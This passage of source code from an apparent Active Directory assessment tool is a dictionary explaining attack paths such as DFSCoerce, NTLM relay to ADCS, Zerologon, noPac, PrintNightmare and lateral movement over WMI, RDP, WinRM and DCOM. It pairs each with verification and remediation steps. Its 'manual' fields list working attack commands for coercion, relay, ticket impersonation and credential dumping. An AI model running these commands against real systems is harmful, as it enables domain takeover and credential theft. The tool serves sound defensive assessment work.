            "(MS-DFSNM), capturing or relaying the victim machine's credentials."
        ),
        "long": (
            "DFSCoerce abuses the Distributed File System Namespace Management "
            "protocol (MS-DFSNM), exposed by the DFS Namespace service on domain "
            "controllers through the \\PIPE\\netdfs named pipe. Its NetrDfsAddStdRoot "
            "and NetrDfsRemoveStdRoot methods take a server name; when it is set to "
            "an attacker-controlled host, {target} connects back and authenticates "
            "as its machine account. {source_type} {source} calls the method "
            "against {target} and captures that authentication, which is then "
            "relayed (classically to ADCS ESC8, or to LDAP for RBCD) to escalate "
            "toward {target}. DFSCoerce is valuable because the DFSNM service runs "
            "on domain controllers by default and, unlike the spooler, cannot "
            "simply be disabled without breaking DFS."
        ),
        "manual": (
            "# Coerce the target over MS-DFSNM to authenticate to your listener:\n"
            "coercer coerce -u <user> -p <pass> -t {target} -l <attacker_ip> "
            "--filter-method-name NetrDfs\n"
            "#   (or the standalone PoC)  dfscoerce.py -u <user> -p <pass> "
            "-d <domain> <attacker_ip> {target}\n"
            "# Pair with a relay (e.g. to ADCS web enrollment, ESC8):\n"
            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
            "--adcs --template DomainController"
        ),
        "verify_windows": (
            "Confirm the DFS Namespace service is present on the target (the "
            "coercion surface) and that relay mitigations are enforced:\n"
            "Get-Service Dfs\n"
            "Get-SmbServerConfiguration | Select-Object RequireSecuritySignature\n"
            "# The DFSNM interface cannot simply be disabled on a DC, so the "
            "defence is to block the relay, not the coercion."
        ),
        "verify_linux": (
            "Enumerate whether the target still exposes the DFSNM coercion methods "
            "(dry run, no relay):\n"
            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-dfsnm"
        ),
        "remediation": (
            "Because the DFS Namespace service cannot be disabled on a domain "
            "controller without breaking DFS, focus on blocking the relay: enable "
            "SMB signing everywhere and enforce LDAP signing plus channel binding "
            "on domain controllers.",
            "Prefer Kerberos over NTLM and, where possible, disable NTLM so a "
            "coerced machine authentication has nothing relayable.",
            "Remove ADCS HTTP web enrollment and enable Extended Protection for "
            "Authentication on any remaining enrollment endpoint so the common "
            "relay target is closed.",
            "Deploy RPC filters to restrict access to the MS-DFSNM interface to "
            "authorized management hosts where feasible.",
        ),
    },
    "coerceandrelayntlmtoadcs": {
        "short": (
            "Coerce-and-relay to ADCS: {source} forces {target} to authenticate, "
            "relays that authentication to the CA's enrollment endpoint, and "
            "obtains a certificate for the victim — up to a domain controller."
        ),
        "long": (
            "This is the full coercion-plus-relay chain against Active Directory "
            "Certificate Services. {source_type} {source} first coerces {target} "
            "into authenticating to an attacker-controlled listener using any "
            "coercion primitive (MS-EFSRPC / PetitPotam, MS-RPRN / PrinterBug, or "
            "MS-DFSNM / DFSCoerce). The victim authenticates as its machine "
            "account, and because the CA's web-enrollment (ESC8) or ICPR RPC "
            "(ESC11) endpoint accepts NTLM without channel binding, that "
            "authentication is relayed straight to the CA and used to request a "
            "client authentication certificate as the victim. When the coerced "
            "victim is a domain controller, the resulting certificate authenticates "
            "the DC machine account and permits directory replication — a direct "
            "path to compromise of {target}. The relay needs only a valid domain "
            "identity, so it is cross-forest capable."
        ),
        "manual": (
            "# 1) Start the relay to the CA's enrollment endpoint, requesting a DC "
            "template:\n"
            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
            "--adcs --template DomainController\n"
            "# 2) Coerce the target (any of EFSRPC / RPRN / DFSNM) to auth to the "
            "relay:\n"
            "coercer coerce -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
            "# 3) Authenticate with the issued certificate to recover a TGT / NT "
            "hash:\n"
            "certipy auth -pfx dc.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm both halves: the CA offers a relay-able enrollment endpoint "
            "AND the coercion surface is reachable. For the CA:\n"
            "Get-WindowsFeature ADCS-Web-Enrollment, ADCS-Enroll-Web-Svc\n"
            "Get-WebBinding | Where-Object { $_.protocol -eq 'http' }\n"
            "# For the relay defence, confirm SMB signing and LDAP channel binding "
            "are enforced:\n"
            "Get-SmbServerConfiguration | Select-Object RequireSecuritySignature"
        ),
        "verify_linux": (
            "Enumerate the CA enrollment endpoints and the target's coercion "
            "methods (read-only, no relay completed):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints"
        ),
        "remediation": (
            "Close the relay target: remove ADCS HTTP web enrollment, require "
            "HTTPS with Extended Protection for Authentication on any enrollment "
            "site, and enable RPC request encryption on the CA (ESC8 / ESC11 "
            "hardening).",
            "Enforce SMB signing everywhere and LDAP signing plus channel binding "
            "on domain controllers so relayed authentication is rejected.",
            "Reduce the coercion surface: disable the Print Spooler on servers that "
            "do not print and apply Microsoft's EFSRPC coercion guidance "
            "(KB5005413).",
            "Prefer Kerberos over NTLM, and disable NTLM where feasible, so a "
            "coerced authentication yields nothing that can be relayed.",
        ),
    },
    "coercetotgt": {
        "short": (
            "Coerce-to-TGT: {source} forces {target} to authenticate and combines "
            "the coerced machine authentication with unconstrained delegation to "
            "capture the victim's Kerberos TGT."
        ),
        "long": (
            "Coerce-to-TGT chains a coercion primitive with unconstrained "
            "delegation. When {source_type} {source} controls a host that is "
            "trusted for unconstrained delegation, any account that authenticates "
            "to it via Kerberos leaves a forwardable TGT cached in that host's "
            "memory. The attacker uses a coercion trigger (PetitPotam / PrinterBug "
            "/ DFSCoerce) to force {target} — ideally a domain controller — to "
            "authenticate to the delegation-trusted host, then extracts the "
            "victim's TGT from the ticket cache. With a DC's TGT the attacker can "
            "act as the domain controller and replicate directory secrets, "
            "compromising {target}. The technique turns 'a machine can be coerced' "
            "plus 'a host has unconstrained delegation' into full domain "
            "compromise."
        ),
        "manual": (
            "# On the unconstrained-delegation host, capture inbound TGTs while "
            "coercing the target:\n"
            "krbrelayx.py -u <user> -p <pass>   # listens and extracts forwarded "
            "TGTs\n"
            "# Coerce the DC to authenticate to the delegation host:\n"
            "coercer coerce -u <user> -p <pass> -t {target} -l <deleg_host>\n"
            "# Use the captured DC TGT (e.g. to replicate secrets):\n"
            "impacket-secretsdump -k -no-pass -dc-ip <dc_ip> {target}"
        ),
        "verify_windows": (
            "Find hosts trusted for unconstrained delegation (the prerequisite for "
            "this chain) and confirm coercion mitigations:\n"
            "Get-ADComputer -LDAPFilter "
            "'(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties "
            "TrustedForDelegation | Select-Object Name, TrustedForDelegation\n"
            "# Confirm sensitive accounts are marked 'Account is sensitive and "
            "cannot be delegated' or are in Protected Users."
        ),
        "verify_linux": (
            "Enumerate unconstrained-delegation hosts and the target's coercion "
            "methods (read-only):\n"
            "nxc ldap {dc_ip} -u <user> -p <pass> --trusted-for-delegation\n"
            "coercer scan -u <user> -p <pass> -t {target} -l <attacker_ip>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained"
        ),
        "remediation": (
            "Remove unconstrained delegation from every host that does not "
            "strictly require it (Set-ADComputer -Identity <host> "
            "-TrustedForDelegation $false); migrate any legitimate need to "
            "constrained or resource-based constrained delegation.",
            "Add privileged accounts to the Protected Users group and set 'Account "
            "is sensitive and cannot be delegated' so their TGTs are never "
            "forwardable to a delegation host.",
            "Reduce the coercion surface: disable the Print Spooler on servers that "
            "do not print and apply Microsoft's EFSRPC coercion guidance.",
            "Enforce SMB signing and prefer Kerberos-only authentication with "
            "strong mitigations so coerced authentication cannot be abused.",
        ),
    },
    "zerologon": {
        "short": (
            "Zerologon (CVE-2020-1472): {source} can exploit a Netlogon "
            "cryptographic flaw to reset the domain controller {target}'s machine "
            "account password to empty and seize the domain."
        ),
        "long": (
            "Zerologon (CVE-2020-1472) is a cryptographic flaw in the Netlogon "
            "Remote Protocol (MS-NRPC). The protocol's AES-CFB8 authentication uses "
            "an all-zero initialization vector, so roughly one in 256 attempts with "
            "an all-zero client challenge and credential authenticates successfully "
            "with no knowledge of the machine's password. An unauthenticated "
            "attacker with network access to a domain controller can therefore, "
            "after a few hundred attempts, authenticate as the DC and then use "
            "Netlogon to reset the DC's own machine account password to an empty "
            "value in Active Directory. With the DC account effectively taken over, "
            "the attacker replicates directory secrets (including the krbtgt hash) "
            "and compromises the entire domain of {target}. Resetting a DC's "
            "machine password is destructive — it desynchronizes the DC from AD and "
            "can break authentication domain-wide if not carefully restored — so "
            "ADscan reports the exposure but does not execute the reset."
        ),
        "manual": (
            "# Non-destructive detection only (does NOT reset the password):\n"
            "nxc smb {target} -u '' -p '' -M zerologon\n"
            "#   (or the checker PoC)  zerologon_tester.py <dc_netbios_name> "
            "{target}\n"
            "# Weaponised exploitation resets the DC machine password and is "
            "destructive — coordinate with the client before running any such tool."
        ),
        "verify_windows": (
            "Confirm the domain controllers have the CVE-2020-1472 patch and are in "
            "enforcement mode. Check the patch level and that Netlogon secure-"
            "channel enforcement is on:\n"
            "Get-HotFix | Where-Object { $_.HotFixID -in "
            "'KB4557222','KB4565349','KB4565351' }\n"
            "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Netlogon"
            "\\Parameters' -Name FullSecureChannelProtection -ErrorAction "
            "SilentlyContinue"
        ),
        "verify_linux": (
            "Run the non-destructive Zerologon check (it does NOT change the "
            "machine password):\n"
            "nxc smb {target} -u '' -p '' -M zerologon\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/netlogon/zerologon"
        ),
        "remediation": (
            "Apply the August 2020 (and later) cumulative updates on every domain "
            "controller so CVE-2020-1472 is fixed, then confirm they are running.",
            "Enable Netlogon secure-channel enforcement mode "
            "(FullSecureChannelProtection = 1) so vulnerable Netlogon connections "
            "are rejected outright.",
            "Review the DC machine account password age (Get-ADComputer -Identity "
            "<dc> -Properties PwdLastSet) and reset it deliberately if a Zerologon "
            "attempt is suspected, following Microsoft's guidance to keep AD and "
            "the local secret in sync.",
            "Monitor for Netlogon authentication anomalies and the associated "
            "machine-account change events (Event ID 4742) on domain controllers.",
        ),
    },
    "nopac": {
        "short": (
            "noPac (CVE-2021-42278/42287): {source} creates a machine account, "
            "renames it to impersonate a domain controller, and requests a "
            "service ticket that grants domain-admin-level access to {target}."
        ),
        "long": (
            "noPac chains two Kerberos flaws, CVE-2021-42278 (sAMAccountName "
            "spoofing) and CVE-2021-42287 (KDC ticket confusion). By default any "
            "authenticated user can create machine accounts (ms-DS-"
            "MachineAccountQuota is 10). {source_type} {source} creates a computer "
            "account, then renames its sAMAccountName to match a domain "
            "controller's name but without the trailing '$'. It requests a TGT for "
            "that name, then deletes or renames the account. When it presents the "
            "TGT for an S4U2self service ticket, the KDC cannot find the exact name "
            "and falls back to appending '$', resolving to the real DC — so it "
            "issues a service ticket whose PAC identifies the caller as the domain "
            "controller. The attacker uses that ticket to act with DC privileges "
            "against {target}, typically replicating directory secrets. Because the "
            "technique manipulates and deletes domain accounts, ADscan reports the "
            "exposure but does not execute it."
        ),
        "manual": (
            "# Detect the MachineAccountQuota and patch prerequisites "
            "(non-destructive):\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -M maq\n"
            "# Weaponised exploitation (creates + renames + deletes a machine "
            "account — coordinate with the client first):\n"
            "impacket-getST -spn 'cifs/{target}' -impersonate administrator "
            "-dc-ip <dc_ip> '<domain>/<new_machine>$:<machine_pass>'"
        ),
        "verify_windows": (
            "Confirm the patch is present and the machine-account quota is not "
            "wide open. Check the two CVE patches and the quota:\n"
            "Get-HotFix | Where-Object { $_.InstalledOn -ge (Get-Date "
            "'2021-11-09') }\n"
            "Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties "
            "ms-DS-MachineAccountQuota | Select-Object ms-DS-MachineAccountQuota\n"
            "# A quota of 0 removes the account-creation prerequisite."
        ),
        "verify_linux": (
            "Read the machine-account quota (the noPac prerequisite) without "
            "exploiting:\n"
            "nxc ldap {dc_ip} -u <user> -p <pass> -M maq\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing"
        ),
        "remediation": (
            "Apply the November 2021 cumulative updates (KB5008102, KB5008380, "
            "KB5008602) on all domain controllers so CVE-2021-42278 and "
            "CVE-2021-42287 are fixed.",
            "Set ms-DS-MachineAccountQuota to 0 so ordinary users cannot create "
            "the machine account the attack depends on (Set-ADDomain -Identity "
            "<domain> -Replace @{{'ms-DS-MachineAccountQuota'=0}}); delegate "
            "computer creation to a defined admin group instead.",
            "Audit machine-account creations and sAMAccountName changes (Event IDs "
            "4741 and 4781) so a spoofing attempt is detected.",
            "Add privileged accounts to Protected Users and monitor for Kerberos "
            "ticket anomalies (Event IDs 4768 / 4769) referencing renamed machine "
            "accounts.",
        ),
    },
    "ms17-010": {
        "short": (
            "MS17-010 (EternalBlue): {source} can exploit an SMBv1 memory "
            "corruption flaw on {target} to run code remotely as SYSTEM without "
            "authentication."
        ),
        "long": (
            "MS17-010 (EternalBlue) is a set of remote code execution "
            "vulnerabilities in Microsoft's SMBv1 server. A crafted sequence of "
            "SMBv1 packets triggers a pool memory corruption in srv.sys, letting an "
            "unauthenticated attacker on the network execute arbitrary code in "
            "kernel context — SYSTEM — on the target {target}. {source_type} "
            "{source} needs only network access to TCP 445 with SMBv1 enabled; no "
            "credentials are required. It is the exploit behind WannaCry and "
            "NotPetya. Because the exploit corrupts kernel memory it can crash the "
            "target (a bluescreen) if it fails, which makes it disruptive against "
            "production systems. It remains present wherever legacy SMBv1 has not "
            "been removed."
        ),
        "manual": (
            "# Non-destructive detection of the SMBv1 vulnerability:\n"
            "nxc smb {target} -u '' -p '' -M ms17-010\n"
            "#   (or)  nmap -p445 --script smb-vuln-ms17-010 {target}\n"
            "# Weaponised exploitation risks crashing the target (kernel memory "
            "corruption) — coordinate with the client before running any exploit."
        ),
        "verify_windows": (
            "Confirm the MS17-010 patch is installed and, more decisively, that "
            "SMBv1 is disabled (removing the vulnerable protocol entirely):\n"
            "Get-HotFix -Id KB4013389 -ErrorAction SilentlyContinue\n"
            "Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol |\n"
            "  Select-Object FeatureName, State\n"
            "Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol"
        ),
        "verify_linux": (
            "Run the non-destructive EternalBlue check (no exploitation):\n"
            "nmap -p445 --script smb-vuln-ms17-010 {target}\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/smb"
        ),
        "remediation": (
            "Disable and remove SMBv1 on every host (Disable-WindowsOptionalFeature "
            "-Online -FeatureName SMB1Protocol; Set-SmbServerConfiguration "
            "-EnableSMB1Protocol $false) — this removes the vulnerable protocol "
            "rather than only patching it.",
            "Apply the MS17-010 security update (KB4013389 and its rollups) on any "
            "system that must retain SMBv1 temporarily.",
            "Restrict SMB (TCP 445) at the network boundary and between segments so "
            "legacy hosts are not reachable from untrusted networks.",
            "Inventory and decommission the legacy systems that still require "
            "SMBv1, since a single unpatched host remains a wormable entry point.",
        ),
    },
    "printnightmare": {
        "short": (
            "PrintNightmare (CVE-2021-34527): {source} can abuse the Print Spooler "
            "on {target} to load an attacker-supplied driver and run code as "
            "SYSTEM, or gain code execution on a remote spooler."
        ),
        "long": (
            "PrintNightmare (CVE-2021-34527, with CVE-2021-1675) is a flaw in the "
            "Windows Print Spooler service. The RpcAddPrinterDriverEx method fails "
            "to properly validate that a caller adding a printer driver has the "
            "required privilege, so an authenticated user can direct the spooler to "
            "load an arbitrary DLL 'driver' from a local or remote path. Because "
            "the spooler runs as SYSTEM, the loaded code executes with full local "
            "privileges — local privilege escalation on the host, and remote code "
            "execution when the vulnerable spooler is targeted over the network. "
            "{source_type} {source} exploits {target}'s spooler to run code as "
            "SYSTEM; on a domain controller that is immediate domain compromise. "
            "Loading a driver into a live SYSTEM service is disruptive and can "
            "destabilize the host, so ADscan reports the exposure but does not "
            "execute it."
        ),
        "manual": (
            "# Non-destructive check that the spooler is running and remotely "
            "reachable:\n"
            "nxc smb {target} -u <user> -p <pass> -M spooler\n"
            "#   (or)  rpcdump.py '<domain>/<user>:<pass>@{target}' | grep -i "
            "'MS-RPRN\\|spoolss'\n"
            "# Weaponised exploitation loads a driver into a SYSTEM service and is "
            "disruptive — coordinate with the client before running any exploit."
        ),
        "verify_windows": (
            "Confirm the spooler is disabled where possible, the CVE-2021-34527 "
            "patch is applied, and the point-and-print hardening is set:\n"
            "Get-Service Spooler | Select-Object Name, Status, StartType\n"
            "Get-HotFix | Where-Object { $_.InstalledOn -ge (Get-Date "
            "'2021-07-06') }\n"
            "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\"
            "Printers\\PointAndPrint' -ErrorAction SilentlyContinue"
        ),
        "verify_linux": (
            "Non-destructive check that the target still exposes the spooler "
            "interface (no exploitation):\n"
            "nxc smb {target} -u <user> -p <pass> -M spooler\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/print-spooler-service"
        ),
        "remediation": (
            "Disable the Print Spooler service on every server that does not need "
            "to print, especially domain controllers (Set-Service -Name Spooler "
            "-StartupType Disabled; Stop-Service Spooler).",
            "Apply the CVE-2021-34527 security updates and enforce the point-and-"
            "print restrictions GPO so only administrators can install printer "
            "drivers (RestrictDriverInstallationToAdministrators = 1).",
            "Where the spooler must run, block remote connections to it via the "
            "'Allow Print Spooler to accept client connections' GPO set to "
            "Disabled.",
            "Monitor for spooler driver-load events (Microsoft-Windows-PrintService "
            "Event ID 316) that indicate an unexpected driver was added.",
        ),
    },
    # ─────────────────────────────────────────────────────────────────────── #
    # BEGIN Tier-2 didactic overlays (concurrent-edit friendly — do NOT reorder
    # or reformat existing overlays above; this is an append-only union block).
    # Lateral movement / access · DCSync + secret-dump primitives · ACL control ·
    # delegation / cross-forest · MSSQL escalation.
    # ─────────────────────────────────────────────────────────────────────── #
    "adminto": {
        "short": (
            "{source} holds local administrator rights on {target}, so it can log "
            "on and run code as SYSTEM and harvest every credential cached on that "
            "host."
        ),
        "long": (
            "Local administrator membership on a host is total control of that "
            "machine. {source_type} {source} that is a local admin on {target} can "
            "authenticate over SMB to the ADMIN$/C$ shares, install and start a "
            "service, schedule a task, or invoke WMI/DCOM to execute commands as "
            "NT AUTHORITY\\SYSTEM. From SYSTEM it can read the SAM and LSA secrets, "
            "dump credentials cached in LSASS, and steal the tokens of any other "
            "user currently logged on — turning one admin relationship into a "
            "foothold for lateral movement across the domain. The right is granted "
            "either by explicit membership in the host's local Administrators group "
            "or by a domain group nested into it (often through a widely-scoped "
            "GPO-pushed 'workstation admins' group), which is why a single "
            "over-broad group can expose hundreds of machines at once."
        ),
        "manual": (
            "# Prove local admin by executing as SYSTEM (pick the quietest transport):\n"
            "impacket-wmiexec -k -no-pass <domain>/<user>@{target}   # WMI, Event 4688\n"
            "#   (or)  impacket-psexec <domain>/<user>:<pass>@{target}   # SCM service, Event 7045 (loud)\n"
            "# Confirm admin + harvest secrets from a low-noise probe:\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain>   # a 'Pwn3d!' marker == local admin\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain> --sam --lsa"
        ),
        "verify_windows": (
            "List the local Administrators group on {target} and expand nested "
            "domain groups to see who is effectively an admin:\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock "
            "{{ Get-LocalGroupMember -Group 'Administrators' }}\n"
            "# Trace a domain group that is nested into local Administrators via GPO:\n"
            "Get-ADGroupMember -Identity '<workstation-admins-group>' -Recursive |\n"
            "  Select-Object name, objectClass"
        ),
        "verify_linux": (
            "Confirm the admin relationship without dumping anything — the 'Pwn3d!' "
            "marker is printed only when the account is a local administrator:\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
        ),
        "remediation": (
            "Enumerate the effective local administrators on the host and remove every principal that does not require them: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }.",
            "Replace broad, GPO-pushed 'all workstation admins' groups with narrowly-scoped, per-tier groups so a single group cannot make one account admin on hundreds of machines; audit the nesting with Get-ADGroupMember -Recursive.",
            "Deploy LAPS so each host has a unique, rotated local Administrator password, removing the shared-local-admin lateral-movement path.",
            "Enforce tier separation (ESAE): Tier-0 admins must never log on to Tier-1/Tier-2 hosts, so their credentials are never cached where a member-server compromise can reach them. Monitor Event IDs 4624/4672 for privileged logons to unexpected hosts.",
        ),
    },
    "canrdp": {
        "short": (
            "{source} can open an interactive Remote Desktop session on {target}, "
            "landing a live desktop it can use to run tooling and reach further into "
            "the network."
        ),
        "long": (
            "Membership in the Remote Desktop Users group (or local administrator "
            "rights) lets {source_type} {source} establish an interactive RDP "
            "session on {target}. An interactive logon is more powerful than a "
            "network logon: the account gets a full desktop, its credentials are "
            "cached in LSASS for the life of the session, and any other user "
            "already logged on interactively has their tokens and cached secrets "
            "exposed to anyone who reaches SYSTEM on that box. RDP is a sanctioned "
            "administration channel, so the traffic itself blends in — the risk is "
            "who can reach it and what privilege they land with. If Restricted "
            "Admin mode is not enforced, the interactive credentials are recoverable, "
            "making a single RDP foothold a pivot for credential theft and onward "
            "lateral movement."
        ),
        "manual": (
            "# Confirm RDP is reachable and the account can log on interactively:\n"
            "nxc rdp {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == interactive logon allowed\n"
            "# Open the session from a Linux vantage:\n"
            "xfreerdp /v:{target} /u:<user> /p:<pass> /d:<domain> /cert:ignore"
        ),
        "verify_windows": (
            "List who may log on via RDP — the local Remote Desktop Users group "
            "plus anyone in local Administrators:\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock "
            "{{ Get-LocalGroupMember -Group 'Remote Desktop Users' }}\n"
            "# Confirm the RDP service is enabled and check whether NLA is required:\n"
            "Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' "
            "-Name fDenyTSConnections"
        ),
        "verify_linux": (
            "Non-destructive check that the account is permitted an interactive RDP "
            "logon (no session opened):\n"
            "nxc rdp {target} -u <user> -p <pass> -d <domain>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
        ),
        "remediation": (
            "Review the Remote Desktop Users group on the host and remove principals that do not need interactive access: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Remote Desktop Users' }.",
            "Require Network Level Authentication and, for administrative RDP, enable Restricted Admin mode (Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DisableRestrictedAdmin -Value 0) so credentials are not left recoverable in the session.",
            "Restrict which source hosts may reach TCP 3389 with a host firewall / network segmentation rule so RDP is not exposed broadly across the estate.",
            "Add high-value accounts to the Protected Users group and enforce tier separation so Tier-0 credentials never RDP into member servers. Monitor Event IDs 4624 (logon type 10) and 4778 for interactive RDP sessions.",
        ),
    },
    "canpsremote": {
        "short": (
            "{source} can run PowerShell remotely on {target} over WinRM, executing "
            "code at the privilege it lands with through a legitimate management "
            "channel."
        ),
        "long": (
            "Windows Remote Management (WinRM/PowerShell Remoting) lets "
            "{source_type} {source} open a remote PowerShell session on {target} "
            "and run commands there. Access is granted by membership in the Remote "
            "Management Users group or by local administrator rights, and the code "
            "runs with the privilege of the connecting account — full SYSTEM-capable "
            "control when that account is a local admin. Because WinRM is the "
            "sanctioned remote-administration protocol (ports 5985/5986), the "
            "activity looks like normal operations, which is exactly why it is a "
            "favoured lateral-movement channel: an attacker who lands a remote "
            "session can load tooling in memory, harvest cached credentials, and "
            "pivot to the next host without dropping a service or a binary the way "
            "noisier techniques do."
        ),
        "manual": (
            "# Confirm WinRM access and command execution:\n"
            "nxc winrm {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == remote exec allowed\n"
            "nxc winrm {target} -u <user> -p <pass> -d <domain> -x 'whoami /all'\n"
            "# Or open an interactive remote shell:\n"
            "evil-winrm -i {target} -u <user> -p <pass>"
        ),
        "verify_windows": (
            "List who may connect over WinRM — the local Remote Management Users "
            "group plus local Administrators:\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock "
            "{{ Get-LocalGroupMember -Group 'Remote Management Users' }}\n"
            "# Confirm the WinRM service is listening and inspect the endpoint ACL:\n"
            "Test-WSMan -ComputerName {target}\n"
            "Get-PSSessionConfiguration -Name Microsoft.PowerShell | "
            "Select-Object -ExpandProperty Permission"
        ),
        "verify_linux": (
            "Non-destructive check that the account is permitted a WinRM session "
            "(no command run):\n"
            "nxc winrm {target} -u <user> -p <pass> -d <domain>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
        ),
        "remediation": (
            "Audit the Remote Management Users group on the host and remove principals that do not need remote PowerShell: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Remote Management Users' }.",
            "Restrict the PowerShell endpoint permission (Get-PSSessionConfiguration | Set-PSSessionConfiguration) to the specific administration group, and prefer constrained (JEA) session configurations that expose only the cmdlets a role needs.",
            "Limit which source hosts may reach TCP 5985/5986 through the host firewall, and require HTTPS (5986) so remoting credentials and traffic are encrypted end to end.",
            "Enable PowerShell script-block and module logging (Event ID 4104) plus WinRM operational logging so remote execution is recorded, and enforce tier separation so Tier-0 accounts never remote into member servers.",
        ),
    },
    "executedcom": {
        "short": (
            "{source} can trigger remote code execution on {target} through a DCOM "
            "object, running commands via an RPC channel with a lighter footprint "
            "than a service install."
        ),
        "long": (
            "Distributed COM lets one host instantiate and drive COM objects on "
            "another. Several shipped objects (for example the MMC20.Application "
            "class or the ShellWindows/ShellBrowserWindow objects) expose methods "
            "that ultimately spawn a process, so an account with local administrator "
            "rights on {target} — here {source} — can call one of those methods "
            "over the DCE/RPC endpoint and have it launch a command for it. DCOM "
            "execution does not install a service (unlike the classic PsExec route) "
            "and its RPC signatures are less widely alerted on, which makes it a "
            "quieter lateral-movement primitive on hosts running an EDR that "
            "baselines service creation. The prerequisite is the same as most "
            "member-server code execution: administrative access on the target, "
            "reachable over RPC (TCP 135 plus the dynamic port range)."
        ),
        "manual": (
            "# Execute a command through a DCOM object on the target (admin required):\n"
            "impacket-dcomexec -object MMC20 <domain>/<user>:<pass>@{target} 'whoami'\n"
            "#   (or)  impacket-dcomexec -object ShellWindows -k -no-pass <domain>/<user>@{target} 'whoami'"
        ),
        "verify_windows": (
            "Confirm the account is a local admin (the prerequisite) and inspect "
            "the DCOM launch/activation ACL on the target:\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock "
            "{{ Get-LocalGroupMember -Group 'Administrators' }}\n"
            "# Review DCOM defaults and per-AppID permissions with the DCOM Config UI:\n"
            "dcomcnfg   # Component Services > Computers > My Computer > COM Security"
        ),
        "verify_linux": (
            "Confirm remote code-execution reach over the target (admin marker), "
            "read-only:\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == exec-capable\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dcom"
        ),
        "remediation": (
            "Remove unnecessary local administrator rights on the host (the prerequisite for DCOM execution): Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }.",
            "Tighten DCOM launch and activation permissions via dcomcnfg (Component Services > DCOM Config) so only required identities can remotely activate COM objects, and remove Everyone/Authenticated Users from Remote Launch/Remote Activation where present.",
            "Restrict RPC exposure: limit which source hosts may reach TCP 135 and the dynamic RPC range through host firewall rules and network segmentation.",
            "Monitor Event ID 4688 (process creation) for anomalous children of dllhost.exe / mmc.exe / explorer.exe on servers, which is the signature of DCOM-driven execution, and correlate with Event 4624 network logons.",
        ),
    },
    "hassession": {
        "short": (
            "A high-value user has an active logon session on {target}, so an "
            "attacker with admin on that host can impersonate them by scheduling a "
            "task under their session and inherit their privileges."
        ),
        "long": (
            "When a privileged user logs on to a member server or workstation, their "
            "logon session and cached credentials live on that host for the life of "
            "the session. If an attacker already holds administrator rights on "
            "{target} — the host where {target} maintains a session — it can "
            "impersonate that user without ever knowing their password: it registers "
            "a scheduled task whose principal is the target user's interactive logon "
            "session, and when the task runs it executes as that user. This turns a "
            "member-server compromise into control of whichever high-value account "
            "happened to be logged on there, which is exactly why exposed Tier-0 "
            "sessions on Tier-1/Tier-2 hosts are so dangerous. The session is "
            "discovered by enumerating logged-on users on the host; the abuse needs "
            "local admin plus the Task Scheduler RPC interface reachable on the "
            "target."
        ),
        "manual": (
            "# Enumerate active sessions to find which privileged user is logged on:\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain> --loggedon-users\n"
            "# With admin on the host, register a task under that user's session to\n"
            "# impersonate them (Task Scheduler RPC over SMB):\n"
            "impacket-atexec -k -no-pass <domain>/<user>@{target} 'whoami'"
        ),
        "verify_windows": (
            "List the interactive sessions on the host to confirm a high-value user "
            "is logged on:\n"
            "Invoke-Command -ComputerName {target} -ScriptBlock "
            "{{ query user }}\n"
            "# Or enumerate logon sessions and their principals:\n"
            "Get-CimInstance -ClassName Win32_LoggedOnUser -ComputerName {target} |\n"
            "  Select-Object Antecedent"
        ),
        "verify_linux": (
            "Read-only enumeration of who is currently logged on to the host:\n"
            "nxc smb {target} -u <user> -p <pass> -d <domain> --loggedon-users\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/impersonation"
        ),
        "remediation": (
            "Enforce tier separation (ESAE): Tier-0 accounts (Domain Admins, Enterprise Admins) must never log on interactively to Tier-1/Tier-2 hosts, so their sessions and cached credentials are never exposed where a member-server compromise can reach them.",
            "Add high-value accounts to the Protected Users group, which prevents credential caching and delegation of those accounts on the hosts they touch.",
